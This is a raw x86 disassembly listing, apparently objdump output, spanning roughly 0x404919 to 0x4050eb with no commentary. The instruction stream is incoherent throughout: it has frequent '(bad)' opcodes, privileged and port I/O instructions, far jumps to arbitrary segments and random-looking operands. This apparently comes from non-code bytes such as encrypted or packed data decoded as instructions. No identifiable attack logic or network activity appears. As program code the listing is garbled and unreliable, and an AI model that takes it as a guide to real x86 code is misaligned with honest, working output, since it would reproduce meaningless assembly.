  404919:	fisubr DWORD PTR [edi-0x58]
  40491c:	das    
  40491d:	inc    edx
  40491e:	adc    dl,BYTE PTR [ecx-0x514c6293]
  404924:	push   ds
  404925:	mov    ebx,0xcbc16490
  40492a:	mov    ecx,0x2d46204d
  40492f:	mov    ecx,0xdfa259ad
  404934:	add    al,0x94
  404936:	leave  
  404937:	adc    BYTE PTR [eax],dl
  404939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40493a:	or     ebp,esp
  40493c:	es dec esp
  40493e:	add    dl,dh
  404940:	mov    esi,0xfef17f5c
  404945:	ja     0x4048d7
  404947:	sbb    eax,DWORD PTR [edx]
  404949:	test   al,0x92
  40494b:	add    DWORD PTR [ebp-0x4266d1ea],0xffffffd0
  404952:	push   edi
  404953:	jg     0x404937
  404955:	adc    DWORD PTR [eax-0x50],eax
  404958:	push   esi
  404959:	sbb    bl,BYTE PTR [ecx-0x4f]
  40495c:	(bad)  
  40495e:	loop   0x4048f8
  404960:	ror    DWORD PTR [edx],0x8f
  404963:	loop   0x4049af
  404965:	sbb    DWORD PTR [ecx-0x485cf39d],esi
  40496b:	mov    ebp,0x14197ba2
  404970:	iret   
  404971:	shl    DWORD PTR [eax+ebp*1-0x2f],0x64
  404976:	es std 
  404978:	scas   eax,DWORD PTR es:[edi]
  404979:	jae    0x404937
  40497b:	in     eax,0x76
  40497d:	addr16 test eax,0xd320d862
  404983:	xlat   BYTE PTR ds:[ebx]
  404984:	push   edx
  404985:	xchg   ebp,eax
  404986:	mov    WORD PTR ds:0xb2eeac1c,ds
  40498c:	lock scas eax,DWORD PTR es:[edi]
  40498e:	sbb    DWORD PTR [ebp+0xf],ecx
  404991:	hlt    
  404992:	add    eax,0x188ef1c9
  404997:	test   DWORD PTR [edi+0x3d44fd5f],ebx
  40499d:	fs popa 
  40499f:	mov    ecx,0xf6fe669
  4049a4:	adc    ecx,ecx
  4049a6:	sbb    al,0xcd
  4049a8:	mov    al,ds:0x1dea5e7c
  4049ad:	clc    
  4049ae:	ret    
  4049af:	shr    BYTE PTR [edi],0x32
  4049b2:	sub    bl,al
  4049b4:	or     DWORD PTR [edi+0x2858684a],esp
  4049ba:	call   0x925f989a
  4049bf:	mov    DWORD PTR [ecx+ecx*8+0x1b03b631],esi
  4049c6:	xor    ebp,edx
  4049c8:	dec    esi
  4049c9:	mov    ecx,0x40383455
  4049ce:	cdq    
  4049cf:	pop    ebx
  4049d0:	frstor [edx]
  4049d2:	cmp    DWORD PTR [esi+0x6d],ebx
  4049d5:	iret   
  4049d6:	mov    dl,0x6f
  4049d8:	loopne 0x404974
  4049da:	icebp  
  4049db:	jg     0x4049b7
  4049dd:	cwde   
  4049de:	and    al,0xe6
  4049e0:	(bad)  
  4049e1:	pop    ss
  4049e2:	test   DWORD PTR [eax],esi
  4049e4:	dec    edx
  4049e5:	sbb    al,BYTE PTR [ecx]
  4049e7:	sti    
  4049e8:	mov    dl,0xf7
  4049ea:	(bad)  
  4049eb:	jae    0x4049c4
  4049ed:	mov    bh,0x5
  4049ef:	or     eax,0x70f52342
  4049f4:	cdq    
  4049f5:	xchg   esp,eax
  4049f6:	mov    ebx,0x6d8b1b4b
  4049fb:	lods   al,BYTE PTR ds:[esi]
  4049fc:	and    ah,BYTE PTR [esi+0x2]
  4049ff:	ret    0xc8a9
  404a02:	lds    ecx,FWORD PTR [ecx+ebx*1+0x23]
  404a06:	cmp    esp,DWORD PTR [ecx]
  404a08:	leave  
  404a09:	sub    BYTE PTR [esi+ecx*8-0x42],ah
  404a0d:	sbb    edi,esp
  404a0f:	aad    0x4
  404a11:	cld    
  404a12:	mov    dh,0xa4
  404a14:	arpl   WORD PTR [esi+0x5b20f71b],di
  404a1a:	(bad)  
  404a1b:	iret   
  404a1c:	clc    
  404a1d:	imul   esp,DWORD PTR [edi],0x9f490532
  404a23:	push   ds
  404a24:	adc    eax,0xd1c75103
  404a29:	mov    edi,0xed4ddb8f
  404a2e:	or     ebp,DWORD PTR [edx+0x3d31e1ca]
  404a34:	pop    eax
  404a35:	fwait
  404a36:	loopne 0x404a48
  404a38:	mov    cs,WORD PTR [ebp+eiz*1-0x20cfe09]
  404a3f:	ficomp WORD PTR [ebp+0x68]
  404a42:	push   0xa12b1da5
  404a47:	dec    esi
  404a48:	xchg   edi,eax
  404a49:	aaa    
  404a4a:	inc    eax
  404a4b:	dec    edx
  404a4c:	aaa    
  404a4d:	lods   eax,DWORD PTR ds:[esi]
  404a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a4f:	leave  
  404a50:	leave  
  404a51:	add    DWORD PTR [edi-0x21],0x3b9e9fec
  404a58:	mov    edx,0xa707a438
  404a5d:	push   ebx
  404a5e:	push   ecx
  404a5f:	in     al,dx
  404a60:	mov    al,0x74
  404a62:	dec    edx
  404a63:	mov    WORD PTR [ebx-0x990a996],?
  404a69:	inc    esi
  404a6a:	call   0xaf81:0xea93a162
  404a71:	aad    0x80
  404a73:	and    al,0x9a
  404a75:	imul   ebp,DWORD PTR [edi-0x50280736],0x3411b2ce
  404a7f:	pop    ecx
  404a80:	sbb    bl,BYTE PTR [edx-0x5bbfc840]
  404a86:	sbb    BYTE PTR [ebp+0x75bb5eb3],bl
  404a8c:	ret    0x9de0
  404a8f:	mov    dl,BYTE PTR [eax]
  404a91:	pop    ss
  404a92:	das    
  404a93:	mov    ecx,0x15a26ea8
  404a98:	push   0x4074df5e
  404a9d:	(bad)  
  404a9e:	in     eax,0xc7
  404aa0:	mov    al,0x4e
  404aa2:	jmp    0xa4b:0xb8c1c2e9
  404aa9:	push   ebx
  404aaa:	mov    cl,0x4d
  404aac:	mov    ebx,0x268d8cf0
  404ab1:	add    al,BYTE PTR [esi+0xa4f711a]
  404ab7:	xchg   DWORD PTR [edx-0xf],edx
  404aba:	nop
  404abb:	cwde   
  404abc:	out    dx,al
  404abd:	push   ecx
  404abe:	sbb    edi,ebx
  404ac0:	sub    BYTE PTR [ebx+0x79],bh
  404ac3:	(bad)  
  404ac4:	das    
  404ac5:	inc    ecx
  404ac6:	add    al,0x0
  404ac8:	cmp    eax,0xe84b0fd9
  404acd:	mov    al,BYTE PTR [ebp-0xbcd325c]
  404ad3:	dec    esp
  404ad4:	dec    edi
  404ad5:	pushf  
  404ad6:	inc    eax
  404ad7:	pop    edi
  404ad8:	(bad)  [eax+0xaef1a0]
  404ade:	hlt    
  404adf:	int3   
  404ae0:	repz mov bl,0x3
  404ae3:	mov    ecx,0xb25fa50
  404ae8:	jecxz  0x404a72
  404aea:	inc    esi
  404aeb:	(bad)  
  404aec:	fs add ebx,esp
  404aef:	or     ebp,DWORD PTR [ecx-0x51]
  404af2:	test   al,0xa1
  404af4:	sub    al,0xc7
  404af6:	mov    al,ah
  404af8:	lds    edx,FWORD PTR ds:0xe910df27
  404afe:	pop    ds
  404aff:	mov    edx,DWORD PTR [ecx-0xf]
  404b02:	addr16 (bad) 
  404b04:	dec    esp
  404b05:	enter  0x8ae2,0x3d
  404b09:	add    dh,BYTE PTR [ecx-0x26]
  404b0c:	fcom   QWORD PTR [eax+0x35]
  404b0f:	shl    BYTE PTR [edi],0xd8
  404b12:	pusha  
  404b13:	mov    esp,0xc4aa8478
  404b18:	jbe    0x404b4b
  404b1a:	les    eax,FWORD PTR [edx+0x53430252]
  404b20:	or     bh,BYTE PTR [esi+0x44]
  404b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b24:	sbb    al,0x3d
  404b26:	lock push ebp
  404b28:	in     eax,0x5f
  404b2a:	or     al,0x59
  404b2c:	jb     0x404b5d
  404b2e:	dec    esp
  404b2f:	push   cs
  404b30:	pop    ecx
  404b31:	add    al,0x34
  404b33:	ficomp DWORD PTR [edi-0x34233a21]
  404b39:	add    ebx,ebx
  404b3b:	inc    edx
  404b3c:	jns    0x404b99
  404b3e:	sub    BYTE PTR [edx+0x68731e79],dh
  404b44:	mov    eax,0x332ac271
  404b49:	mov    ebp,0x39f0fe33
  404b4e:	jae    0x404b4c
  404b50:	inc    ebp
  404b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b52:	dec    esp
  404b53:	out    0x91,eax
  404b55:	and    al,0x8a
  404b57:	cmp    al,0xa7
  404b59:	es jno 0x404b0d
  404b5c:	sahf   
  404b5d:	pop    ebp
  404b5e:	inc    edx
  404b5f:	repnz inc ebp
  404b61:	scas   eax,DWORD PTR es:[edi]
  404b62:	bound  edi,QWORD PTR [ebp-0x363aa829]
  404b68:	or     ch,BYTE PTR [ecx]
  404b6a:	mov    eax,0x98b45c99
  404b6f:	ins    DWORD PTR es:[edi],dx
  404b70:	repnz mov esp,0x414b4ad6
  404b76:	inc    eax
  404b77:	lahf   
  404b78:	fstp   DWORD PTR [ebp-0xd604a71]
  404b7e:	js     0x404b85
  404b80:	mov    ecx,0xe1edbfca
  404b85:	add    eax,0x491d62a0
  404b8a:	es aad 0xd1
  404b8d:	(bad)  
  404b8f:	fcomp  QWORD PTR [eax-0x6bc8811f]
  404b95:	ror    BYTE PTR [ecx],1
  404b97:	cmp    al,al
  404b99:	les    edi,FWORD PTR [esi+0x5d]
  404b9c:	adc    cl,0xcb
  404b9f:	retf   0xc4f4
  404ba2:	and    eax,DWORD PTR [edi+0x78]
  404ba5:	mov    BYTE PTR [eax+0x77],dh
  404ba8:	(bad)  
  404ba9:	xchg   edx,eax
  404baa:	aaa    
  404bab:	and    DWORD PTR [edi+0x8],0x159244cb
  404bb2:	arpl   WORD PTR ds:0xe95cd742,di
  404bb8:	icebp  
  404bb9:	bound  ebx,QWORD PTR [ecx]
  404bbb:	jmp    0xf462:0xc2310b88
  404bc2:	cmp    ch,BYTE PTR [ecx-0x1f081d44]
  404bc8:	dec    esp
  404bc9:	ja     0x404b72
  404bcb:	icebp  
  404bcc:	ins    DWORD PTR es:[edi],dx
  404bcd:	jnp    0x404c41
  404bcf:	bound  esi,QWORD PTR [edx+0x796831e2]
  404bd5:	mov    edi,0x7fc61066
  404bda:	adc    esp,DWORD PTR [ecx+esi*1+0x36]
  404bde:	stos   DWORD PTR es:[edi],eax
  404bdf:	mov    ah,cl
  404be1:	xor    edx,ebx
  404be3:	ins    DWORD PTR es:[edi],dx
  404be4:	cmp    al,0x46
  404be6:	call   0xadbc8ea0
  404beb:	popf   
  404bec:	aaa    
  404bed:	xor    esp,ecx
  404bef:	xchg   ebp,edi
  404bf1:	pushf  
  404bf2:	jb     0x404bfb
  404bf4:	cld    
  404bf5:	push   0x7f5b3d26
  404bfa:	loopne 0x404bc6
  404bfc:	pushf  
  404bfd:	(bad)  
  404bfe:	loope  0x404c50
  404c00:	lds    esi,FWORD PTR [edi]
  404c02:	fld    TBYTE PTR [eax+0xb]
  404c05:	pop    eax
  404c06:	xor    BYTE PTR [esi-0x7fa92747],ah
  404c0c:	pop    esp
  404c0d:	imul   edx,DWORD PTR [esi+0x65],0x13
  404c11:	and    BYTE PTR [esi-0x74],0xc0
  404c15:	(bad)  
  404c16:	out    0x4c,al
  404c18:	loope  0x404c4f
  404c1a:	mov    esi,0x720dfe53
  404c1f:	jbe    0x404c07
  404c21:	xor    DWORD PTR [edi+0x5f563316],ebp
  404c27:	inc    ebp
  404c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c29:	mov    esp,0x7915ff6c
  404c2e:	and    eax,0xdfb10300
  404c33:	rcl    ecx,1
  404c35:	hlt    
  404c36:	addr16 in al,dx
  404c38:	mov    WORD PTR ds:0x99662cc0,gs
  404c3e:	pusha  
  404c3f:	xchg   BYTE PTR [ebx],dh
  404c41:	shl    bh,0xff
  404c44:	inc    ebx
  404c45:	sbb    edx,esi
  404c47:	scas   al,BYTE PTR es:[edi]
  404c48:	aam    0x6c
  404c4a:	(bad)  
  404c4b:	mov    ds:0xdab3f7c4,eax
  404c50:	sbb    eax,0x8298999d
  404c55:	add    DWORD PTR [eax+0x58],ebx
  404c58:	inc    ebx
  404c59:	add    ebx,DWORD PTR ds:0x1fc9b349
  404c5f:	pop    ebp
  404c60:	aaa    
  404c61:	cdq    
  404c62:	pop    eax
  404c63:	add    al,0x35
  404c65:	ja     0x404c25
  404c67:	iret   
  404c68:	jns    0x404ccf
  404c6a:	dec    eax
  404c6b:	sbb    DWORD PTR [ecx+0x3b782594],eax
  404c71:	mov    cl,0xf9
  404c73:	mov    BYTE PTR [edi],cl
  404c75:	xchg   ebx,eax
  404c76:	daa    
  404c77:	xor    ecx,edx
  404c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c7a:	mov    eax,0x985924ee
  404c7f:	(bad)  
  404c80:	pop    ecx
  404c81:	dec    eax
  404c82:	lods   al,BYTE PTR ds:[esi]
  404c83:	dec    eax
  404c84:	sbb    bh,0x22
  404c87:	or     al,0xed
  404c89:	in     eax,dx
  404c8a:	adc    esi,edi
  404c8c:	dec    ebx
  404c8d:	iret   
  404c8e:	or     ch,ah
  404c90:	les    eax,FWORD PTR [ecx-0x3]
  404c93:	xor    ah,BYTE PTR [edx]
  404c95:	ins    BYTE PTR es:[edi],dx
  404c96:	std    
  404c97:	test   BYTE PTR [esi],bh
  404c99:	outs   dx,BYTE PTR ds:[esi]
  404c9a:	xchg   edx,eax
  404c9b:	leave  
  404c9c:	fistp  WORD PTR [eax+eax*8+0x3c33229e]
  404ca3:	js     0x404ce7
  404ca5:	aaa    
  404ca6:	push   edx
  404ca7:	xor    eax,0xe428240e
  404cac:	xchg   edi,ebp
  404cae:	lods   eax,DWORD PTR ds:[esi]
  404caf:	ins    DWORD PTR es:[edi],dx
  404cb0:	push   0xfe24f49
  404cb5:	mov    edx,0x706190f5
  404cba:	sub    BYTE PTR [esi+ebp*2-0x5f],dh
  404cbe:	jne    0x404ca2
  404cc0:	jmp    0xfb21:0x4bf284d3
  404cc7:	jo     0x404d35
  404cc9:	mov    BYTE PTR [ebx+0x78],dl
  404ccc:	sbb    esp,0xe3dabe15
  404cd2:	push   ebp
  404cd3:	cmp    eax,0x6a2e4910
  404cd8:	arpl   WORD PTR [ecx],ax
  404cda:	jne    0x404c95
  404cdc:	mov    DWORD PTR [ecx-0x651a8c00],ebp
  404ce2:	cli    
  404ce3:	push   eax
  404ce4:	call   0xd22f:0xfb27b827
  404ceb:	(bad)  
  404cec:	out    dx,eax
  404ced:	(bad)  
  404cee:	push   esi
  404cef:	jbe    0x404cb3
  404cf1:	fwait
  404cf2:	cmc    
  404cf3:	in     eax,0xf2
  404cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cf6:	je     0x404ca1
  404cf8:	es fcmovnu st,st(6)
  404cfb:	call   0x6b7c:0x8ab50280
  404d02:	adc    esp,edi
  404d04:	stos   DWORD PTR es:[edi],eax
  404d05:	pop    ss
  404d06:	nop
  404d07:	ret    
  404d08:	pop    esp
  404d09:	hlt    
  404d0a:	sbb    esp,0xfffffffc
  404d0d:	cmp    BYTE PTR [ebp-0xf],al
  404d10:	out    0x16,al
  404d12:	sti    
  404d13:	mov    dl,bh
  404d15:	mov    cl,0x0
  404d17:	rol    BYTE PTR [edx+0x31],cl
  404d1a:	aad    0xa5
  404d1c:	bound  edi,QWORD PTR [eax+0x6a7e8e6b]
  404d22:	out    0x22,al
  404d24:	fstp   QWORD PTR [eax]
  404d26:	xor    eax,0xbbe5c08e
  404d2b:	test   al,0x76
  404d2d:	sub    al,0xfa
  404d2f:	adc    ecx,DWORD PTR [esi+ebx*4-0x3f79ff10]
  404d36:	add    DWORD PTR ds:0x18a4b5a3,ebp
  404d3c:	stos   BYTE PTR es:[edi],al
  404d3d:	shl    DWORD PTR [ebp+0x28d7ae21],1
  404d43:	mov    ecx,?
  404d45:	aaa    
  404d46:	mov    esi,0xe084d7aa
  404d4b:	retf   
  404d4c:	add    dh,dl
  404d4e:	std    
  404d4f:	imul   ebx,DWORD PTR [edi],0xffffffbc
  404d52:	push   0xd
  404d54:	jmp    0x2e9:0x22a4626d
  404d5b:	push   DWORD PTR [esi+0x29]
  404d5e:	adc    al,0xd0
  404d60:	jmp    0xbcd7:0x19054ea7
  404d67:	fwait
  404d68:	sbb    bl,dl
  404d6a:	sar    DWORD PTR [esi+0x4bc7c969],cl
  404d70:	xor    BYTE PTR [edi-0x2a],dh
  404d73:	(bad)  
  404d74:	les    eax,FWORD PTR [edx+0x69]
  404d77:	pslld  mm6,QWORD PTR ds:[ebp+0x4f]
  404d7c:	add    esp,DWORD PTR ds:[edi-0x21]
  404d80:	jge    0x404d56
  404d82:	pop    esp
  404d83:	test   eax,0xd788dc14
  404d88:	imul   ebx,DWORD PTR [edi-0x56],0x8477ff09
  404d8f:	retf   0x424c
  404d92:	(bad)  [ebp+0x56a37954]
  404d98:	bnd ret 
  404d9a:	push   edi
  404d9b:	jnp    0x404d83
  404d9d:	cwde   
  404d9e:	dec    BYTE PTR [eax+edx*8]
  404da1:	adc    al,0xec
  404da3:	dec    esp
  404da4:	adc    DWORD PTR [eax+edi*2-0x58],esi
  404da8:	xor    eax,0xdd96bef6
  404dad:	push   edx
  404dae:	xor    esp,DWORD PTR [edi+edx*8]
  404db1:	outs   dx,DWORD PTR ds:[esi]
  404db2:	sub    ebp,DWORD PTR [edx]
  404db4:	or     ebp,DWORD PTR [ecx-0x64]
  404db7:	out    dx,al
  404db8:	rol    BYTE PTR [eax-0x80],0x29
  404dbc:	and    bl,BYTE PTR [ebp+0x5f6f8cba]
  404dc2:	pop    edi
  404dc3:	dec    eax
  404dc4:	out    dx,al
  404dc5:	fisttp WORD PTR [esi-0x54]
  404dc8:	stos   DWORD PTR es:[edi],eax
  404dc9:	psrld  mm7,QWORD PTR [edx+esi*8]
  404dcd:	iret   
  404dce:	lods   al,BYTE PTR ds:[esi]
  404dcf:	jl     0x404e3f
  404dd1:	mov    WORD PTR [ecx-0x7bd4f03f],?
  404dd7:	sub    ebx,DWORD PTR [edx+0x16]
  404dda:	xor    esp,esp
  404ddc:	stos   DWORD PTR es:[edi],eax
  404ddd:	jl     0x404d96
  404ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de0:	retf   0xdd3a
  404de3:	nop
  404de4:	es jnp 0x404dda
  404de7:	add    cl,bl
  404de9:	cmp    ebp,DWORD PTR [ecx]
  404deb:	xchg   edx,eax
  404dec:	enter  0xbe6,0xe0
  404df0:	fbld   TBYTE PTR [ecx-0xead571f]
  404df6:	popa   
  404df7:	sbb    esp,edi
  404df9:	mov    edx,0xaddf2d64
  404dfe:	and    al,0xd4
  404e00:	imul   ecx,DWORD PTR [edi],0x17
  404e03:	out    dx,eax
  404e04:	shr    BYTE PTR [esi+0x586583cb],1
  404e0a:	add    ebp,DWORD PTR [edx]
  404e0c:	mov    edi,DWORD PTR [eax]
  404e0e:	ja     0x404df0
  404e10:	daa    
  404e11:	idiv   BYTE PTR [esi-0x65dd15e4]
  404e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e19:	push   ecx
  404e1a:	lds    eax,FWORD PTR [esi+ebp*1]
  404e1d:	out    0xda,al
  404e1f:	cdq    
  404e20:	and    DWORD PTR [ecx+0x2f],0xa2cf50f8
  404e27:	cmp    ebp,esp
  404e29:	cdq    
  404e2a:	imul   esi,DWORD PTR [edx],0x5f
  404e2d:	repz mov bl,0xa1
  404e30:	retf   0x2903
  404e33:	jecxz  0x404e6c
  404e35:	xchg   DWORD PTR [esi-0x786b6306],ebp
  404e3b:	sbb    dl,dh
  404e3d:	es (bad) 
  404e3f:	(bad)  
  404e40:	mov    edi,0x50cb4adb
  404e45:	lock mov edi,0xa5d1007d
  404e4b:	push   ebx
  404e4c:	adc    bh,BYTE PTR [ebx+0x18]
  404e4f:	push   ds
  404e50:	ror    BYTE PTR [ebx+0xc],0xec
  404e54:	mov    edx,0xe17faf07
  404e59:	lea    esp,[ecx-0x2e6cc929]
  404e5f:	mov    cl,0x21
  404e61:	add    eax,0x61514be
  404e66:	jns    0x404eb5
  404e68:	cwde   
  404e69:	fisttp QWORD PTR [edx+0x20]
  404e6c:	sub    BYTE PTR [esi-0x261ef470],dh
  404e72:	in     al,0x18
  404e74:	test   eax,0x3bd0cee9
  404e79:	push   ds
  404e7a:	jmp    0xf903:0x8501f659
  404e81:	jo     0x404e81
  404e83:	add    al,0x77
  404e85:	stos   DWORD PTR es:[edi],eax
  404e86:	xor    DWORD PTR [ebx+ecx*8+0x15049f1d],edx
  404e8d:	jb     0x404ee8
  404e8f:	sub    eax,0xdb689504
  404e94:	fdivr  DWORD PTR [eax+eax*2-0x4ecffcb6]
  404e9b:	xchg   ebx,eax
  404e9c:	out    0x36,al
  404e9e:	push   esi
  404e9f:	adc    esi,DWORD PTR [ebp+0x3ca799b9]
  404ea5:	mov    WORD PTR [esi-0x59],ds
  404ea8:	push   ebx
  404ea9:	data16 jae 0x404ebe
  404eac:	pusha  
  404ead:	push   esp
  404eae:	fisttp DWORD PTR [esi]
  404eb0:	mov    ds:0x80441c45,eax
  404eb5:	mov    ds:0x48068404,eax
  404eba:	ins    DWORD PTR es:[edi],dx
  404ebb:	mov    bh,0xe1
  404ebd:	fadd   DWORD PTR [esi-0x1]
  404ec0:	out    dx,eax
  404ec1:	fisttp DWORD PTR ds:0x66d51dbb
  404ec7:	jae    0x404e82
  404ec9:	inc    edx
  404eca:	jnp    0x404eef
  404ecc:	mov    WORD PTR [edi-0x3cb8190b],ds
  404ed2:	dec    edx
  404ed3:	sub    eax,0x9e364358
  404ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ed9:	leave  
  404eda:	loop   0x404e9b
  404edc:	add    DWORD PTR ds:0x4ff8dd07,edx
  404ee2:	fsub   DWORD PTR [esi]
  404ee4:	push   ebx
  404ee5:	repz hlt 
  404ee7:	jb     0x404e87
  404ee9:	dec    edi
  404eea:	or     DWORD PTR [ebx],esp
  404eec:	xchg   ebp,eax
  404eed:	dec    edx
  404eee:	mov    edi,0xbfaeda55
  404ef3:	and    esp,DWORD PTR [edx]
  404ef5:	inc    ebp
  404ef6:	jle    0x404f69
  404ef8:	mov    ds:0xb3d81960,eax
  404efd:	pop    es
  404efe:	jno    0x404ee7
  404f00:	sub    ecx,DWORD PTR [eax]
  404f02:	loope  0x404f39
  404f04:	add    eax,0x949674fb
  404f09:	fisubr DWORD PTR [ebx]
  404f0b:	in     al,dx
  404f0c:	scas   al,BYTE PTR es:[edi]
  404f0d:	fsubr  QWORD PTR [esi]
  404f0f:	xchg   edx,eax
  404f10:	stos   BYTE PTR es:[edi],al
  404f11:	neg    DWORD PTR [edx]
  404f13:	test   al,0x7f
  404f15:	xchg   DWORD PTR [eax-0x3b],ecx
  404f18:	inc    esi
  404f19:	jmp    0x404f54
  404f1b:	aas    
  404f1c:	cli    
  404f1d:	xchg   ecx,eax
  404f1e:	adc    al,0x77
  404f20:	leave  
  404f21:	xchg   BYTE PTR [edi+0x439bbd59],dh
  404f27:	leave  
  404f28:	sbb    eax,0xe0b9e2a7
  404f2d:	aaa    
  404f2e:	cmp    DWORD PTR [ecx],esi
  404f30:	pop    esi
  404f31:	cmc    
  404f32:	mov    dh,0xc4
  404f34:	pop    edx
  404f35:	adc    ah,BYTE PTR [edi-0x102eff20]
  404f3b:	call   0x82279702
  404f40:	mov    ds:0xdea56bcf,al
  404f45:	inc    ebp
  404f46:	test   BYTE PTR [edx],0x10
  404f49:	stos   DWORD PTR es:[edi],eax
  404f4a:	cmp    BYTE PTR [edi+0x6e],dh
  404f4d:	and    dh,ch
  404f4f:	pop    ebx
  404f50:	retf   0x7d2c
  404f53:	mov    BYTE PTR [ebx-0x71391b9d],dl
  404f59:	fdivp  st(5),st
  404f5b:	stc    
  404f5c:	pop    ebp
  404f5d:	jb     0x404ee8
  404f5f:	push   ebp
  404f60:	cmp    edi,DWORD PTR [edx+0x3e608e4b]
  404f66:	hlt    
  404f67:	cmp    edx,ebp
  404f69:	lea    eax,[edi+0x36e99846]
  404f6f:	enter  0x6717,0x11
  404f73:	adc    eax,0x74e418fe
  404f78:	pusha  
  404f79:	dec    ebp
  404f7a:	cmp    al,0x1a
  404f7c:	jae    0x404f36
  404f7e:	xchg   ecx,edi
  404f80:	bound  eax,QWORD PTR [ebp+eiz*1+0x4160b8a2]
  404f87:	ins    BYTE PTR es:[edi],dx
  404f88:	cmp    DWORD PTR [edi-0x2d],ebx
  404f8b:	mov    edx,0xaa1fdce0
  404f90:	test   DWORD PTR [ecx-0x33],ecx
  404f93:	pop    esi
  404f94:	fucomip st,st(7)
  404f96:	rcl    DWORD PTR [ecx+0x35],cl
  404f99:	stos   DWORD PTR es:[edi],eax
  404f9a:	mov    ecx,DWORD PTR [ebx+0x7346753a]
  404fa0:	mov    cs,WORD PTR [ecx]
  404fa2:	sbb    eax,0xfeae6cee
  404fa7:	inc    eax
  404fa8:	daa    
  404fa9:	ins    BYTE PTR es:[edi],dx
  404faa:	push   ebp
  404fab:	or     BYTE PTR [esi+0x2462085],cl
  404fb1:	outs   dx,BYTE PTR ds:[esi]
  404fb2:	sbb    esp,0x36
  404fb5:	rol    BYTE PTR [edx-0xf],0xdd
  404fb9:	mov    edx,0xf9bb4472
  404fbe:	js     0x404f9b
  404fc0:	pop    eax
  404fc1:	enter  0x74b3,0x6
  404fc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fc6:	adc    ecx,DWORD PTR [edi-0x5b871403]
  404fcc:	mov    edi,0x91a0c0a8
  404fd1:	pop    esi
  404fd2:	sbb    BYTE PTR [edx-0x2f9470f4],0x74
  404fd9:	lds    edi,FWORD PTR [ebp-0x58fc2e67]
  404fdf:	xor    cl,dl
  404fe1:	cmc    
  404fe2:	pop    ebp
  404fe3:	outs   dx,DWORD PTR ds:[esi]
  404fe4:	pop    ecx
  404fe5:	call   0xd2f6:0x7e783dcb
  404fec:	push   esi
  404fed:	icebp  
  404fee:	cld    
  404fef:	imul   bl
  404ff1:	or     DWORD PTR [edi+0x543d92e9],edx
  404ff7:	xlat   BYTE PTR ds:[ebx]
  404ff8:	xor    BYTE PTR [ebp+0x52],bl
  404ffb:	out    dx,eax
  404ffc:	sar    DWORD PTR [edi+0x11235792],cl
  405002:	frstor [edx+0x6b59ff1e]
  405008:	mov    bl,0x4e
  40500a:	mov    bl,0xa5
  40500c:	xor    eax,0x77149489
  405011:	mov    ebx,0x6ee18ba4
  405016:	mov    dl,0x1d
  405018:	and    al,0x1d
  40501a:	fisub  WORD PTR [ecx]
  40501c:	in     al,0x59
  40501e:	sub    eax,0x15c3d59e
  405023:	mov    cl,0x3d
  405025:	jg     0x404ff9
  405027:	add    DWORD PTR [ebx+esi*8-0x61],0x6e7c1bdd
  40502f:	rcl    ebx,cl
  405031:	pop    edi
  405032:	and    DWORD PTR [edx+0x153a0825],0x8ed1bae6
  40503c:	lahf   
  40503d:	inc    edx
  40503e:	sbb    dl,al
  405040:	push   ecx
  405041:	xor    ah,BYTE PTR [esp+edi*2+0x5e28104e]
  405048:	fbstp  TBYTE PTR [ecx]
  40504a:	imul   BYTE PTR [edi-0x37]
  40504d:	js     0x405072
  40504f:	ins    BYTE PTR es:[edi],dx
  405050:	sub    al,0xf4
  405052:	push   0x385a052
  405057:	dec    edi
  405058:	adc    eax,0x811726b4
  40505d:	dec    esi
  40505e:	fild   DWORD PTR [ecx+esi*1+0x9]
  405062:	pusha  
  405063:	iret   
  405064:	imul   eax,DWORD PTR [ecx],0x1e336b2b
  40506a:	in     eax,dx
  40506b:	sub    DWORD PTR ds:0x68238cb3,ebp
  405071:	or     ebp,esi
  405073:	pop    edi
  405074:	mov    DWORD PTR [edx+esi*8+0x43],eax
  405078:	pop    edi
  405079:	ss adc eax,0x464bda03
  40507f:	iret   
  405080:	bound  ebp,QWORD PTR es:[edi-0x4f]
  405084:	push   cs
  405085:	dec    edx
  405086:	or     al,0x43
  405088:	test   al,0x27
  40508a:	out    dx,al
  40508b:	ss xchg esp,eax
  40508d:	xor    edi,DWORD PTR [ecx+0x42]
  405090:	cmp    al,0x7a
  405092:	out    dx,eax
  405093:	rcr    al,0x66
  405096:	fistp  WORD PTR [ebp-0x34]
  405099:	repz jb 0x405056
  40509c:	mov    dh,0x45
  40509e:	mov    ebx,edx
  4050a0:	pop    eax
  4050a1:	sub    DWORD PTR [edi],ecx
  4050a3:	fdiv   st,st(6)
  4050a5:	out    dx,eax
  4050a6:	cmp    ecx,DWORD PTR [eax+0x46]
  4050a9:	sbb    esp,edi
  4050ab:	pushf  
  4050ac:	xchg   ebx,eax
  4050ad:	retf   
  4050ae:	jl     0x4050b0
  4050b0:	mov    ah,0x59
  4050b2:	push   ebx
  4050b3:	sbb    edi,esp
  4050b5:	popa   
  4050b6:	sbb    al,0xee
  4050b8:	xchg   edx,eax
  4050b9:	sbb    DWORD PTR [ecx+0x7a],ebx
  4050bc:	rcr    DWORD PTR [esi],cl
  4050be:	sti    
  4050bf:	sbb    ecx,DWORD PTR [ecx]
  4050c1:	(bad)  
  4050c2:	or     bl,ah
  4050c4:	outs   dx,DWORD PTR es:[esi]
  4050c6:	jmp    FWORD PTR [edx-0x1b]
  4050c9:	mov    al,0x98
  4050cb:	adc    ebx,DWORD PTR [edx+esi*8]
  4050ce:	ret    0x434c
  4050d1:	fwait
  4050d2:	in     al,0x2c
  4050d4:	push   es
  4050d5:	sbb    al,0xa2
  4050d7:	xchg   ebx,eax
  4050d8:	loopne 0x40514d
  4050da:	adc    ecx,DWORD PTR [ecx-0x7f73b068]
  4050e0:	jns    0x405063
  4050e2:	lock sub eax,0xc86c3491
  4050e8:	adc    DWORD PTR [ecx],edi
  4050ea:	out    dx,al
  4050eb:	push   esi
